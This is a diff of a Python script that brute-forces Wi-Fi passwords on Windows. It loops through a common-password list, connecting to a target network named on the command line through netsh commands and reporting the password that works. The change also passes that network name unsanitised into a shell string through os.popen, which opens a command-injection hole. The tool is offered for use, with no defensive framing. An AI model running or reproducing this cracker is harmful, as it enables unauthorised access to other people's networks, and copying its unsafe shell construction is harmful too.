@@ -1,11 +1,12 @@
+import os
 import sys
 import time
 import string
 import itertools
-import subprocess
 from datetime import timedelta
 from timeit import default_timer as timer
 
+# python main.py "wifiname"
 # NEED TO DISABLE YOUR WIFI IF YOU ARE CONNECTED TO ONE
 
 DURATION = timer()  # How long take
@@ -29,13 +30,10 @@ def addingCredentials(password, wifiName=sys.argv[-1]):
 
 # Some netsh commands
 def commandLineInterfaces():
-    subprocess.run('netsh wlan add profile filename=base.xml interface=Wi-Fi',
-                   stdout=subprocess.PIPE, text=True)
-    subprocess.run(f"netsh wlan connect name={sys.argv[-1]}",
-                   stdout=subprocess.PIPE, text=True)
+    os.popen(
+        f'netsh wlan add profile filename=base.xml interface=Wi-Fi && netsh wlan connect name={sys.argv[-1]}')
     time.sleep(WAITING_RESPONSE_SECOND)
-    return subprocess.run(f"netsh interface show interface",
-                          stdout=subprocess.PIPE, text=True).stdout
+    return os.popen(f"netsh interface show interface").read().split()
 
 
 # Common password txt
@@ -47,14 +45,14 @@ def wifiCommonPassword():
 # Console output
 def outPut(password, index):
     addingCredentials(password)
-    if 'Connected' in commandLineInterfaces().split():
+    if 'Connected' in commandLineInterfaces()[::-1]:
         print(
             f"Password Unlocked: {password} | tried: {index} | duration: {timedelta(seconds=timer()-DURATION)}")
         sys.exit()
     print(f"Fail password: {password} | tried: {index}")
 
 
-# 10-million-password-list.txt
+# Loading every common password
 def force_brute_txt():
     DB_PASSWORD = wifiCommonPassword()
     for index, password in enumerate(DB_PASSWORD):
